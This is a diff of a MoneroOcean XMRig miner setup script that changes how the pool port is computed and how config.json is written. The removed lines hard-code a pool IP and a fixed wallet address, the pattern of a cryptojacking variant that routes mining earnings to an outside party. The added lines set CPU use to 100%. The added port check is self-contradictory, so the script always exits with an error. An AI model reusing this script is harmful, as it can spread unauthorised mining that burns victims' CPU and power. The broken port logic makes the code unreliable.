@@ -169,13 +169,13 @@ power2() {
 PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
-PORT=$(( 10000 + $PORT ))
+PORT=$(( 80 + $PORT ))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
   exit 1
 fi
 
-if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
+if [ "$PORT" -lt "80" -o "$PORT" -gt "80" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
@@ -283,8 +283,8 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "131.153.56.98:80",/' ./config.json
-sed -i 's/"user": *"[^"]*",/"user": "4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR",/' ./config.json
+sed -i 's/"url": *"[^"]*",/"url": "131.153.56.98:'$PORT'",/' $HOME/moneroocean/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
